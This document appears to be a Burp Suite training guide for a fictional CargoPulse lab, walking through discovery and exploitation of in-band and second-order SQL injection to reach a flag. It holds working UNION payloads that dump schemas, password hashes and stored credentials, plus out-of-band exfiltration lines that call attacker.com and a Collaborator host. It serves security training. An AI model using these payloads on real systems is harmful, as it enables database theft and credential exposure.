# Burp Suite Testing Guide — CargoPulse Training Lab

This guide teaches how to investigate the CargoPulse application using Burp Suite to discover and exploit the SQL injection vulnerabilities.

## Prerequisites

- Burp Suite Professional or Community Edition
- CargoPulse lab running locally (docker compose up --build)
- Browser configured to use Burp Proxy

## Phase 1 — Reconnaissance

### 1.1 Identify Application Routes

**Objective**: Discover all accessible endpoints in the application.

**Steps**:
1. Browse the application normally: Login as customer@cargopulse.test (LabPass123!)
2. Navigate through the customer portal: dashboard, tracking, history, search
3. Attempt to access operations console: Go directly to /ops/dashboard
4. Note the access denied response

**Burp Configuration**:
- Proxy: Intercept ON
- Target: Site map (right-click → "Add to scope")
- Scope: Include localhost:8080

**Expected Findings**:
- GET / → redirect to login
- GET /login → login form
- POST /login.attempt → login processing
- GET /logout → logout processing
- GET /portal/* → customer portal routes
- GET /ops/* → operations console routes

### 1.2 Identify Parameters and Input Points

**Objective**: Find all user-controllable inputs.

**Steps**:
1. Focus on the shipment search form: /portal/shipments/search
2. Enter various tracking numbers (CP-AX91-4821, invalid-tracking, etc.)
3. Observe responses in Burp history
4. Attempt to access operations console as customer (should fail)
5. Login as operations user and examine report builder

**Key Parameters to Test**:
- `tracking` parameter in GET /portal/shipments/search
- `report_type` and `filter_expression` in POST /ops/reports
- `job_id` in GET /ops/reports/generate
- Login form fields: email, password

### 1.3 Map Authentication Boundaries

**Objective**: Understand privilege separation between customer and operations.

**Steps**:
1. Login as customer user
2. Attempt direct access to /ops/reports/create
3. Note 302 redirect to login with error message
4. Login as operations user
5. Access /ops/reports/create successfully
6. Attempt to create report filters

**Expected Finding**: Role-based middleware blocks customer access to /ops/* routes.

## Phase 2 — Input Discovery

### 2.1 Test Tracking Number Parameter

**Objective**: Understand normal behavior of shipment search.

**Steps**:
1. Send multiple requests to `/portal/shipments/search?tracking=<value>` with different values:
   - Valid tracking: `CP-AX91-4821` (from seed data)
   - Invalid tracking: `does-not-exist`
   - Empty tracking: (empty value)
   - Special characters: `'`, `\"`, `--`, `;`
2. Compare response lengths and status codes
3. Look for differences in:
   - Response body length
   - Presence of "No shipment found." message
   - Table rows returned

**Burp Tools**:
- Intruder: Sniper attack with payload list
- Repeater: Manual testing and variation
- Comparer: Side-by-side response comparison

### 2.2 Test Report Filter Parameters

**Objective**: Understand report creation workflow.

**Steps** (as operations user):
1. Navigate to /ops/reports/create
2. Enter various filter expressions:
   - Safe: `is_restricted = 0`
   - With quotes: `customer_name = 'Helix Medical Logistics'`
   - Numeric: `id > 5`
   - SQL keywords: `status LIKE 'pen%'`
3. Submit and observe:
   - Success/error messages
   - Stored filter in report queue
   - Ability to generate report

### 2.3 Identify Hidden Parameters

**Objective**: Discover any non-obvious inputs.

**Steps**:
1. Examine HTML source of forms for hidden fields
2. Check for AJAX/XHR requests in network tab
3. Look for API endpoints in JavaScript
4. Test common parameter names: `format`, `limit`, `offset`, `sort`, `order`

## Phase 3 — SQLi Detection

### 3.1 Establish Baseline

**Objective**: Create a reference for normal responses.

**Steps**:
1. Create a request in Repeater for: `GET /portal/shipments/search?tracking=CP-AX91-4821`
2. Send and save as baseline
3. Note response length, status code, and content (should show one shipment)

### 3.2 Test Basic SQL Injection

**Objective**: Determine if input affects SQL query.

**Steps**:
1. Test boolean conditions:
   - `CP-AX91-4821' AND '1'='1` → should return same as baseline
   - `CP-AX91-4821' AND '1'='2` → should return "No shipment found."
2. Test comment characters:
   - `CP-AX91-4821'--` 
   - `CP-AX91-4821'#`
   - `CP-AX91-4821';`
3. Test union injection preparation:
   - `CP-AX91-4821' ORDER BY 1--`
   - `CP-AX91-4821' ORDER BY 2--`
   - ... increment until error
   - Find number of columns (should be 7)

**Detection Techniques in Burp**:
- **Intruder**: Sniper attack with payloads like `' AND '1'='1`, `' AND '1'='2`
- **Comparer**: Auto-compare responses for length differences
- **Sequencer**: Analyze response variability for blind injection (less likely here due to in-band)

### 3.3 Confirm Database Type

**Objective**: Determine if backend is PostgreSQL, MySQL, etc.

**Steps**:
1. Test PostgreSQL-specific syntax:
   - `CP-AX91-4821' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--`
   - `CP-AX91-4821' AND (SELECT version()) LIKE 'PostgreSQL%'--`
2. Test MySQL-specific syntax:
   - `CP-AX91-4821' AND (SELECT @@version) LIKE '%MySQL%'--`
3. Observe which payloads return data vs "No shipment found."

### 3.4 Test Union Injection Feasibility

**Objective**: Determine if UNION injection can extract data.

**Steps**:
1. Find column count (should be 7 as per schema)
2. Test NULL compatibility:
   - `CP-AX91-4821' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--`
3. Test data type compatibility per column:
   - Column 1 (id): integer
   - Column 2 (tracking_number): string
   - Column 3 (customer_name): string
   - Column 4 (origin): string
   - Column 5 (destination): string
   - Column 6 (shipped_at): datetime
   - Column 7 (is_restricted): boolean

## Phase 4 — Exploitation

### 4.1 Extract Database Schema

**Objective**: Map the database structure.

**Steps**:
1. Use UNION injection to query information_schema:
   ```
   ' UNION SELECT table_name, column_name, data_type, NULL, NULL, NULL, NULL 
     FROM information_schema.columns 
     WHERE table_name NOT IN ('migrations') 
     ORDER BY table_name, ordinal_position--
   ```
2. Look for interesting tables: `users`, `shipments`, `report_jobs`, `internal_credentials`, `security_challenges`
3. Note column names and types for each table

### 4.2 Extract Sensitive Data via First-Order SQLi

**Objective**: Demonstrate direct data extraction.

**Steps**:
1. Extract application version/user:
   ```
   ' UNION SELECT NULL, user(), database(), version(), NULL, NULL, NULL--
   ```
2. Extract shipment data:
   ```
   ' UNION SELECT id, tracking_number, customer_name, origin, destination, shipped_at, is_restricted FROM shipments--
   ```
3. Extract user credentials (hashed passwords):
   ```
   ' UNION SELECT NULL, email, password_hash, role, department, NULL, NULL FROM users--
   ```

### 4.3 Discover the Report Workflow

**Objective**: Find the connection to second-order SQLi.

**Steps**:
1. From schema enumeration, note the `report_jobs` table structure
2. Look for the special shipment `CP-VOID-7719`:
   ```
   ' UNION SELECT NULL, tracking_number, NULL, NULL, NULL, NULL, metadata FROM shipments WHERE tracking_number='CP-VOID-7719'--
   ```
3. The metadata should contain JSON/reference to report workflow
4. Note the `filter_expression` column in `report_jobs`

### 4.4 Demonstrate Second-Order SQL Injection

**Objective**: Exploit the stored injection path.

**Steps**:
1. As operations user, create a report with malicious filter:
   ```
   Filter Expression: 1=1 UNION SELECT id, flag, NULL, NULL, NULL, NULL, NULL FROM security_challenges--
   Report Type: exfiltration
   ```
2. Save the filter (should show as pending)
3. Generate the report using the job ID from the queue
4. Observe results containing the flag from security_challenges
5. Alternative: Extract internal credentials:
   ```
   1=1 UNION SELECT id, service_name, username, secret_value, environment, description, NULL FROM internal_credentials--
   ```

### 4.5 Retrieve the Final Flag

**Objective**: Complete the attack chain.

**Expected Result**: 
The flag should appear in the report results as:
```
CP{second_order_sqli_chain_complete}
```

## Advanced Testing Techniques

### Timing Attacks (if blind injection were needed)
Though not required for this lab (in-band available), techniques would include:
- `'; IF (1=1) WAITFOR DELAY '00:00:05'--` (SQL Server)
- `'; SELECT SLEEP(5) WHERE '1'='1` (MySQL)
- `'; SELECT pg_sleep(5) WHERE '1'='1` (PostgreSQL)

### Out-of-Band Data Exfiltration
For environments without in-band output:
- DNS exfiltration: `'; LOAD_FILE(CONCAT('\\\\', (SELECT flag), '.attacker.burpcollaborator.net\\test'))--`
- HTTP requests: `'; UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT flag))--` (Oracle)

## Reporting Findings

When documenting vulnerabilities:

### SQL-01: In-band SQL Injection in Shipment Search
- **Location**: GET /portal/shipments/search?tracking=
- **Payload Example**: `' UNION SELECT NULL, table_name, column_name, NULL, NULL, NULL, NULL FROM information_schema.columns--`
- **Impact**: Full database read access
- **Fix**: Use parameterized queries with prepared statements

### SQL-02: Second-Order SQL Injection in Report Processing
- **Location**: POST /ops/reports/create → GET /ops/reports/generate
- **Payload Example**: `1=1 UNION SELECT NULL, flag, NULL, NULL, NULL, NULL, NULL FROM security_challenges--`
- **Impact**: Privileged data access via stored injection
- **Fix**: Validate and sanitize stored input; use allowlists for dynamic SQL

## Burp Suite Configuration Tips

### Scanner Configuration
- Enable: SQL injection checks
- Disable: Vulnerable unless confirmed (for training lab)
- Authentication: Configure with operations/support credentials for full coverage

### Intruder Payload Types
- **Sniper**: Test one position at a time
- **Battering ram**: Same payload to all positions
- **Pitchfork**: Different payloads to each position
- **Cluster bomb**: All combinations of payload sets

### Decoder Uses
- URL decode/encode payloads
- Base64 encode data exfiltration attempts
- HTML encode for identifying reflected parameters

## Troubleshooting

### No Response Difference
- Check if WAF or filtering is blocking payloads
- Try different encoding (URL, Unicode, double-encoding)
- Verify you're testing the correct parameter

### Application Errors
- 500 errors may reveal stack traces (information disclosure)
- 403/402 indicate access control issues
- 404 indicates wrong endpoint

### False Positives
- Compare with true baseline
- Use multiple boolean conditions to confirm
- Look for consistent patterns across requests

## Legal and Ethical Reminder

This guide is for authorized security testing only. 
- Only test systems you own or have explicit permission to test
- All data in this lab is fictional and for training purposes
- Do not use these techniques against production systems without authorization